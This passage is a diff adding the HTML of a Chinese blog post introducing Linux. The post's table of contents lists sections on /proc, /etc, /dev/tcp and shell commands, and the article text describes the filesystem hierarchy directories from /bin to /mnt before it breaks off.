@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="linux介绍Linux，全称GNU&#x2F;Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux">
+<meta property="og:url" content="http://p5ych2022.github.io/2023/05/14/linux/index.html">
+<meta property="og:site_name" content="psych&#39;s blog">
+<meta property="og:description" content="linux介绍Linux，全称GNU&#x2F;Linux，是一种免费使用和自由传播的类UNIX操作系统，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1024x719.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221025215812113.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202116575-1024x150.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202241887-1024x78.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026202509378.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/4b27211904a247f5b42fcb706ddbfb12.jpeg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225108937-1024x284.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210139910.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210033960-1024x101.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026221707080-1024x373.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222100823-1024x72.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20210521100903155.jpg">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210635328-1024x410.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222757599-1024x83.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225531886-1024x80.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192501209-1024x398.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192850010.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193104696-1024x429.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193634755-1024x172.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193903339-1024x493.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200644069-1024x155.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200821690-1024x406.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027201546949-1024x290.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1-1024x173.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1024x173.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202105222-1024x98.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/v2-a298559e05d7b6be063b84717f6db6f1_1440w.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027203802404-1024x713.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221031020410633-1024x370.png">
+<meta property="article:published_time" content="2023-05-14T04:42:33.000Z">
+<meta property="article:modified_time" content="2023-08-16T15:16:46.848Z">
+<meta property="article:author" content="psych">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1024x719.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>linux</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Article</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/05/14/xml/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/14/php/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://p5ych2022.github.io/2023/05/14/linux/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://p5ych2022.github.io/2023/05/14/linux/&text=linux"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://p5ych2022.github.io/2023/05/14/linux/&is_video=false&description=linux"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=linux&body=Check out this article: http://p5ych2022.github.io/2023/05/14/linux/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://p5ych2022.github.io/2023/05/14/linux/&title=linux"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://p5ych2022.github.io/2023/05/14/linux/&name=linux&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://p5ych2022.github.io/2023/05/14/linux/&t=linux"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#linux%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">linux介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">文件系统的层次结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">目录解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%89%80%E6%9C%89%E7%9B%AE%E5%BD%95"><span class="toc-number">3.2.</span> <span class="toc-text">根目录下所有目录</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#bin"><span class="toc-number">3.2.0.1.</span> <span class="toc-text">&#x2F;bin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sbin"><span class="toc-number">3.2.0.2.</span> <span class="toc-text">&#x2F;sbin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#etc"><span class="toc-number">3.2.0.3.</span> <span class="toc-text">&#x2F;etc ***</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#home"><span class="toc-number">3.2.0.4.</span> <span class="toc-text">&#x2F;home</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lib"><span class="toc-number">3.2.0.5.</span> <span class="toc-text">&#x2F;lib</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lost-found"><span class="toc-number">3.2.0.6.</span> <span class="toc-text">&#x2F;lost+found</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#media"><span class="toc-number">3.2.0.7.</span> <span class="toc-text">&#x2F;media</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mnt"><span class="toc-number">3.2.0.8.</span> <span class="toc-text">&#x2F;mnt</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#opt"><span class="toc-number">3.2.0.9.</span> <span class="toc-text">&#x2F;opt ***</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#proc"><span class="toc-number">3.2.0.10.</span> <span class="toc-text">&#x2F;proc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#root"><span class="toc-number">3.2.0.11.</span> <span class="toc-text">&#x2F;root</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#selinux"><span class="toc-number">3.2.0.12.</span> <span class="toc-text">&#x2F;selinux</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#srv"><span class="toc-number">3.2.0.13.</span> <span class="toc-text">&#x2F;srv</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sys"><span class="toc-number">3.2.0.14.</span> <span class="toc-text">&#x2F;sys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tmp"><span class="toc-number">3.2.0.15.</span> <span class="toc-text">&#x2F;tmp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#usr"><span class="toc-number">3.2.0.16.</span> <span class="toc-text">&#x2F;usr</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#usr-bin"><span class="toc-number">3.2.0.16.1.</span> <span class="toc-text">&#x2F;usr&#x2F;bin</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#usr-sbin"><span class="toc-number">3.2.0.16.2.</span> <span class="toc-text">&#x2F;usr&#x2F;sbin</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#usr-src"><span class="toc-number">3.2.0.16.3.</span> <span class="toc-text">&#x2F;usr&#x2F;src</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#var"><span class="toc-number">3.2.0.17.</span> <span class="toc-text">&#x2F;var ***</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%9B%AE%E5%BD%95"><span class="toc-number">3.3.</span> <span class="toc-text">重要目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-1"><span class="toc-number">3.3.1.</span> <span class="toc-text">&#x2F;proc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">各种目录</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-cmdline"><span class="toc-number">3.3.1.2.1.</span> <span class="toc-text">&#x2F;proc&#x2F;cmdline</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-environ"><span class="toc-number">3.3.1.2.2.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;environ</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-exe"><span class="toc-number">3.3.1.2.3.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;exe</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-maps"><span class="toc-number">3.3.1.2.4.</span> <span class="toc-text">&#x2F;proc&#x2F;maps</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-fd"><span class="toc-number">3.3.1.2.5.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;fd</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-cpuinfo"><span class="toc-number">3.3.1.2.6.</span> <span class="toc-text">&#x2F;proc&#x2F;cpuinfo</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-modules"><span class="toc-number">3.3.1.2.7.</span> <span class="toc-text">&#x2F;proc&#x2F;modules</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-fb"><span class="toc-number">3.3.1.2.8.</span> <span class="toc-text">&#x2F;proc&#x2F;fb</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-stat"><span class="toc-number">3.3.1.2.9.</span> <span class="toc-text">&#x2F;proc&#x2F;stat</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#proc-N-cwd"><span class="toc-number">3.3.1.2.10.</span> <span class="toc-text">&#x2F;proc&#x2F;N&#x2F;cwd</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#etc-1"><span class="toc-number">3.3.2.</span> <span class="toc-text">&#x2F;etc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-passwd"><span class="toc-number">3.3.2.0.1.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-shells"><span class="toc-number">3.3.2.0.2.</span> <span class="toc-text">&#x2F;etc&#x2F;shells</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-group"><span class="toc-number">3.3.2.0.3.</span> <span class="toc-text">&#x2F;etc&#x2F;group</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-fstab"><span class="toc-number">3.3.2.0.4.</span> <span class="toc-text">&#x2F;etc&#x2F;fstab</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-rc-d"><span class="toc-number">3.3.2.0.5.</span> <span class="toc-text">&#x2F;etc&#x2F;rc.d</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-init-d"><span class="toc-number">3.3.2.0.6.</span> <span class="toc-text">&#x2F;etc&#x2F;init.d</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-shadow"><span class="toc-number">3.3.2.0.7.</span> <span class="toc-text">&#x2F;etc&#x2F;shadow</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#etc-hosts"><span class="toc-number">3.3.2.0.8.</span> <span class="toc-text">&#x2F;etc&#x2F;hosts</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.3.</span> <span class="toc-text">web服务器重要文件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#apache"><span class="toc-number">3.3.3.0.1.</span> <span class="toc-text">apache</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#nginx%EF%BC%88dd%EF%BC%89"><span class="toc-number">3.3.3.0.2.</span> <span class="toc-text">nginx（dd）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">常见命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">查看当前用户</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bip%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">4.0.0.3.</span> <span class="toc-text">查看ip等信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E4%BD%8D%E7%BD%AE%E8%B7%AF%E5%BE%84"><span class="toc-number">4.0.0.4.</span> <span class="toc-text">显示当前位置路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#find"><span class="toc-number">4.0.0.5.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%EF%BC%88-%EF%BC%89"><span class="toc-number">4.0.0.6.</span> <span class="toc-text">系统信息（*）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E5%8E%8B%E7%BC%A9%E5%91%BD%E4%BB%A4"><span class="toc-number">4.0.0.7.</span> <span class="toc-text">解压缩命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-dd"><span class="toc-number">4.0.0.8.</span> <span class="toc-text">计划任务(dd)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#vim%E7%BC%96%E8%BE%91"><span class="toc-number">4.0.0.9.</span> <span class="toc-text">vim编辑</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.</span> <span class="toc-text">重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91-HTTP-%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">重定向 HTTP 状态码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E4%B8%AD%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.2.</span> <span class="toc-text">linux中重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">输入重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">5.2.0.2.</span> <span class="toc-text">输出重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%EF%BC%9A-dev-tcp-dd"><span class="toc-number">5.2.0.3.</span> <span class="toc-text">特殊文件： &#x2F;dev&#x2F;tcp(dd)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="toc-number">5.3.</span> <span class="toc-text">管道符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">5.3.0.1.</span> <span class="toc-text">命令连接符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%A1%E9%81%93%E7%AC%A6-%E8%AF%A6%E8%A7%A3"><span class="toc-number">5.3.0.2.</span> <span class="toc-text">管道符 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">5.3.0.2.1.</span> <span class="toc-text">作用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-number">5.3.0.2.2.</span> <span class="toc-text">用法</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        linux
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">psych</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-14T04:42:33.000Z" class="dt-published" itemprop="datePublished">2023-05-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/web%E5%9F%BA%E7%A1%80/">web基础</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/linux/" rel="tag">linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="linux介绍"><a href="#linux介绍" class="headerlink" title="linux介绍"></a>linux介绍</h2><p>Linux，全称GNU&#x2F;Linux，是一种<strong>免费</strong>使用和自由传播的<strong>类UNIX操作系统</strong>，其内核由林纳斯·本纳第克特·托瓦兹于1991年10月5日首次发布，它主要受到Minix和Unix思想的启发，是一个基于POSIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版，如基于社区开发的debian、archlinux，和基于商业开发的Red Hat Enterprise Linux、SUSE、Oracle Linux等。</p>
+<p>主要用于服务器端，嵌入式开发（占用内存少）</p>
+<h2 id="文件系统的层次结构"><a href="#文件系统的层次结构" class="headerlink" title="文件系统的层次结构"></a>文件系统的层次结构</h2><p>文件系统的最顶层是由根目录开始的，系统使用“**&#x2F;<strong>”来表示</strong>根目录**，在根目录之下的既可以是目录，也可以是文件，而每一个目录中又可以包含（子）目录或文件。如此反复就可以构成一个庞大的文件系统。</p>
+<p>为了避免诸多Linux发行版使用各部相同的文件系统结构，Linux基金会发布了<strong>FHS</strong>标准，多数Linux发行版系统都遵循这一标准。</p>
+<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1024x719.png" style="zoom:67%;" />
+
+<p><strong>FHS认为根目录(&#x2F;)下应该包含如下子目录</strong></p>
+<p>（官方）</p>
+<p>目录</p>
+<p>应放置档案内容</p>
+<p>&#x2F;bin</p>
+<p>系统有很多放置执行档的目录，但&#x2F;bin比较特殊。因为&#x2F;bin放置的是在单人维护模式下还能够被操作的<strong>指令</strong>。在&#x2F;bin底下的指令可以被root与一般帐号所使用，主要有：cat,chmod(修改权限), chown, date, mv, mkdir, cp, bash等等常用的指令。</p>
+<p>&#x2F;boot</p>
+<p>主要放置<strong>开机</strong>会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。Linux kernel常用的档名为：vmlinuz ，如果使用的是grub这个开机管理程式，则还会存在&#x2F;boot&#x2F;grub&#x2F;这个目录。</p>
+<p>&#x2F;dev</p>
+<p>（device）在Linux系统上，任何<strong>装置与周边设备</strong>都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp_, &#x2F; dev&#x2F;hd_, &#x2F;dev&#x2F;sd*等等</p>
+<p>&#x2F;etc***</p>
+<p>系统主要的<strong>设定档</strong>几乎都放置在这个目录内，例如<strong>人员的帐号密码档、各种服务的启始档</strong>等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，但是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有：&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;等等。 另外，其下重要的目录有：**&#x2F;etc&#x2F;init.d&#x2F;** ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话： &#x2F;etc&#x2F;init.d&#x2F;iptables start、&#x2F;etc&#x2F;init.d&#x2F; iptables stop &#x2F;etc&#x2F;xinetd.d&#x2F; ：这就是所谓的super daemon管理的各项服务的设定档目录。 &#x2F;etc&#x2F;X11&#x2F; ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。（配置信息）</p>
+<p>&#x2F;home</p>
+<p>这是系统预设的使用者<strong>家目录</strong>(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录。</p>
+<p>&#x2F;lib</p>
+<p>系统的函式库非常的多，而&#x2F;lib放置的则是在<strong>开机时会用到的函式库</strong>，以及在&#x2F;bin或&#x2F;sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是&#x2F;lib&#x2F;modules&#x2F;这个目录，因为该目录会放置核心相关的模组(驱动程式)。</p>
+<p>&#x2F;media</p>
+<p>media是媒体的英文，顾名思义，这个&#x2F;media底下放置的就是<strong>可移除的装置</strong>。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdrom等等。</p>
+<p>&#x2F;mnt</p>
